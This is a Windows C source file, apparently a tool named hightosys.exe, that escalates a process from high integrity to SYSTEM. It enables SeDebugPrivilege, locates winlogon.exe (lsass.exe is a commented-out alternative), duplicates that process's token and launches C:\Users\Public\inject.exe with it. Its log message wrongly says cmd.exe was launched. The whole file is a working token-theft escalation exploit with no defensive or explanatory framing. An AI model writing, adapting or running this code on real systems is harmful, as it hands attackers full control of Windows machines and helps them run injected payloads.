#include <windows.h>
#include <stdio.h>
#include <tchar.h>
#include <tlhelp32.h>
#include "nyx_api.h"

#define SE_DEBUG_PRIVILEGE 20

BOOL SetPrivilege(HANDLE hToken, LPCTSTR lpszPrivilege, BOOL bEnablePrivilege) {
    TOKEN_PRIVILEGES tp;
    LUID luid;

    if (!LookupPrivilegeValue(NULL, lpszPrivilege, &luid)) {
        hprintf("LookupPrivilegeValue error: %u\n", GetLastError());
        return FALSE;
    }

    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = luid;
    if (bEnablePrivilege)
        tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    else
        tp.Privileges[0].Attributes = 0;

    if (!AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), (PTOKEN_PRIVILEGES)NULL, (PDWORD)NULL)) {
        hprintf("AdjustTokenPrivileges error: %u\n", GetLastError());
        return FALSE;
    }

    if (GetLastError() == ERROR_NOT_ALL_ASSIGNED) {
        hprintf("The token does not have the specified privilege.\n");
        return FALSE;
    }

    return TRUE;
}

BOOL CheckIntegrityLevel(HANDLE hToken, LPDWORD pdwIntegrityLevel) {
    DWORD dwLengthNeeded;
    PTOKEN_MANDATORY_LABEL pTIL = NULL;

    if (!GetTokenInformation(hToken, TokenIntegrityLevel, NULL, 0, &dwLengthNeeded)) {
        if (GetLastError() != ERROR_INSUFFICIENT_BUFFER) {
            hprintf("GetTokenInformation failed (%d)\n", GetLastError());
            return FALSE;
        }
    }

    pTIL = (PTOKEN_MANDATORY_LABEL)LocalAlloc(0, dwLengthNeeded);
    if (pTIL == NULL) {
        hprintf("LocalAlloc failed\n");
        return FALSE;
    }

    if (!GetTokenInformation(hToken, TokenIntegrityLevel, pTIL, dwLengthNeeded, &dwLengthNeeded)) {
        hprintf("GetTokenInformation failed (%d)\n", GetLastError());
        LocalFree(pTIL);
        return FALSE;
    }

    *pdwIntegrityLevel = *GetSidSubAuthority(pTIL->Label.Sid, (DWORD)(UCHAR)(*GetSidSubAuthorityCount(pTIL->Label.Sid) - 1));

    LocalFree(pTIL);
    return TRUE;
}

void PrintIntegrityLevel(DWORD dwIntegrityLevel) {
    if (dwIntegrityLevel >= SECURITY_MANDATORY_SYSTEM_RID) {
        hprintf("Process Integrity: System\n");
    }
    else if (dwIntegrityLevel >= SECURITY_MANDATORY_HIGH_RID) {
        hprintf("Process Integrity: High\n");
    }
    else if (dwIntegrityLevel >= SECURITY_MANDATORY_MEDIUM_RID) {
        hprintf("Process Integrity: Medium\n");
    }
    else if (dwIntegrityLevel >= SECURITY_MANDATORY_LOW_RID) {
        hprintf("Process Integrity: Low\n");
    }
    else {
        hprintf("Process Integrity: Unknown\n");
    }
}


void CheckDebugPrivilege(HANDLE hToken) {
    DWORD dwLength = 0;
    PTOKEN_PRIVILEGES pTokenPrivileges = NULL;
    if (!GetTokenInformation(hToken, TokenPrivileges, NULL, 0, &dwLength)) {
        if (GetLastError() != ERROR_INSUFFICIENT_BUFFER) {
            hprintf("GetTokenInformation failed (%d)\n", GetLastError());
            return;
        }
    }
    pTokenPrivileges = (PTOKEN_PRIVILEGES)LocalAlloc(LPTR, dwLength);
    if (pTokenPrivileges == NULL) {
        hprintf("LocalAlloc failed\n");
        return;
    }
    if (!GetTokenInformation(hToken, TokenPrivileges, pTokenPrivileges, dwLength, &dwLength)) {
        hprintf("GetTokenInformation failed (%d)\n", GetLastError());
        LocalFree(pTokenPrivileges);
        return;
    }

    for (DWORD i = 0; i < pTokenPrivileges->PrivilegeCount; i++) {
        DWORD dwSize = 256;
        CHAR szPrivilegeName[256] = "";
        if (LookupPrivilegeNameA(NULL, &(pTokenPrivileges->Privileges[i].Luid), szPrivilegeName, &dwSize)) {
            if (strcmp(szPrivilegeName, "SeDebugPrivilege") == 0) {
                if (pTokenPrivileges->Privileges[i].Attributes & SE_PRIVILEGE_ENABLED) {
                    hprintf("SeDebugPrivilege     Status: Enabled\n");
                }
                else {
                    hprintf("SeDebugPrivilege     Status: Disabled\n");
                }
                break;
            }
        }
    }
    LocalFree(pTokenPrivileges);
}

DWORD FindSystemProcess() {
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) {
        hprintf("CreateToolhelp32Snapshot failed (%d)\n", GetLastError());
        return 0;
    }

    PROCESSENTRY32W pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32W);

    if (!Process32FirstW(hSnapshot, &pe32)) {
        hprintf("Process32First failed (%d)\n", GetLastError());
        CloseHandle(hSnapshot);
        return 0;
    }


    DWORD systemPID = 0;
    do {
        // 여러 SYSTEM 프로세스를 확인
        hprintf("%ws\n", pe32.szExeFile);
        if (_wcsicmp(pe32.szExeFile, L"winlogon.exe") == 0)
            //_wcsicmp(pe32.szExeFile, L"lsass.exe") == 0)
            //_wcsicmp(pe32.szExeFile, L"services.exe") == 0) 
            {
            systemPID = pe32.th32ProcessID;
            break;
        }
    } while (Process32NextW(hSnapshot, &pe32));

    CloseHandle(hSnapshot);
    return systemPID;
}

int main() {
    HANDLE hToken;
    HANDLE hCurrentProcess = GetCurrentProcess();
    HANDLE hSystemToken = NULL;
    HANDLE hSystemProcess = NULL;
    DWORD dwIntegrityLevel;
    
    hprintf("Start hightosys.exe...\n");

    // get hightosystem.exe process token
    if (!OpenProcessToken(hCurrentProcess, TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) {
        hprintf("OpenProcessToken failed (%d)\n", GetLastError());
        return 1;
    }

    // enable SeDebugPrivilege to hightosystem.exe (I LOVE MSDN)
    if (!SetPrivilege(hToken, SE_DEBUG_NAME, TRUE)) {
        hprintf("SetPrivilege failed\n");
        CloseHandle(hToken);
        return 1;
    }
    
    if (CheckIntegrityLevel(hToken, &dwIntegrityLevel)) {
        PrintIntegrityLevel(dwIntegrityLevel);
    }

    // Check privileges
    CheckDebugPrivilege(hToken);

    DWORD systemPID = FindSystemProcess();
    if (systemPID == 0) {
        hprintf("Failed to find a suitable SYSTEM process\n");
        CloseHandle(hToken);
        return 1;
    }
    hprintf("System PID is %d...\n", systemPID);

    hSystemProcess = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, systemPID);
    if (hSystemProcess == NULL) {
        hprintf("OpenProcess failed for SYSTEM process (%d)\n", GetLastError());
        CloseHandle(hToken);
        return 1;
    }

    // Duplicate the SYSTEM token
    if (!OpenProcessToken(hSystemProcess, TOKEN_DUPLICATE, &hSystemToken)) {
        hprintf("OpenProcessToken failed for SYSTEM process (%d)\n", GetLastError());
        CloseHandle(hSystemProcess);
        CloseHandle(hToken);
        return 1;
    }

    HANDLE hNewToken;
    if (!DuplicateTokenEx(hSystemToken, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &hNewToken)) {
        hprintf("DuplicateTokenEx failed (%d)\n", GetLastError());
        CloseHandle(hSystemToken);
        CloseHandle(hSystemProcess);
        CloseHandle(hToken);
        return 1;
    }

    // Create a new process with the SYSTEM token
    STARTUPINFO si;
    PROCESS_INFORMATION pi;
    ZeroMemory(&si, sizeof(STARTUPINFO));
    si.cb = sizeof(STARTUPINFO);

    if (!CreateProcessWithTokenW(hNewToken, 0, L"C:\\Users\\Public\\inject.exe", NULL, 0, NULL, NULL, &si, &pi)) {
        hprintf("CreateProcessWithTokenW failed (%d)\n", GetLastError());
    }
    else {
        hprintf("Successfully launched cmd.exe with SYSTEM privileges\n");
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    }

    CloseHandle(hNewToken);
    CloseHandle(hSystemToken);
    CloseHandle(hSystemProcess);
    CloseHandle(hToken);

    return 0;
}
